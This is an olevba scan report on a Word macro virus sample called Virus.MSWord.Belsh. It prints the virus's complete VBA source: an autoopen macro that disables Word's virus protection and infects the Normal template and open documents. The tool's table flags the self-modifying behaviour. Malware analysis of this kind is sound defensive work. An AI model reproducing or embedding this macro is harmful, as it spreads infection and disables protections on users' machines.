olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Belsh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Belsh - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO kgrffb.bas 
in file: Virus.MSWord.Belsh - OLE stream: 'Macros/VBA/kgrffb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Rem"Ìî?êîììåíòàðè"
Rem"Ìî?êîììåíòàðè"
Sub autoopen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = 0
ActiveDocument.ReadOnlyRecommended = False
WordBasic.DisableAutoMacros -1
Set AD = ActiveDocument.VBProject.VbcoMponents
Set NT = NormalTemplate.VBProject.VbcoMponents
InfectedAD = False
InfectedNT = False
For i = 1 To AD.Count
If AD(i).Name = "kgrffb" Then InfectedAD = True
Next i
For t = 1 To NT.Count
If NT(t).Name = "kgrffb" Then InfectedNT = True
Next t
 '§ß§à§Ó§à§Ö
If InfectedAD = True And InfectedNT = True Then Exit Sub
If InfectedAD = False Then
For i = 1 To AD.Count
AD(i).CoDemodule.deleteLines 1, AD.VbpojeCt.VbcoMponents(i).CoDemodule.CountofLines
Next i
NT("kgrffb").Export (Application.StartupPath & "\kgrffb")
AD.IMport (Application.StartupPath & "\kgrffb")
End If
If InfectedNT = False Then
For i = 1 To NT.Count
NT(i).CoDemodule.deleteLines 1, NT.VbpojeCt.VbcoMponents(i).CoDemodule.CountofLines
Next i
AD("kgrffb").Export (Application.StartupPath & "\kgrffb")
NT.IMport (Application.StartupPath & "\kgrffb")
End If
ActiveDocument.ReadOnlyRecommended = False

ActiveDocument.Save
NormalTemplate.Save
 If Options.BlueScreen = True Then ShowVisualBasicEditor = True
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbcoMponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CoDemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

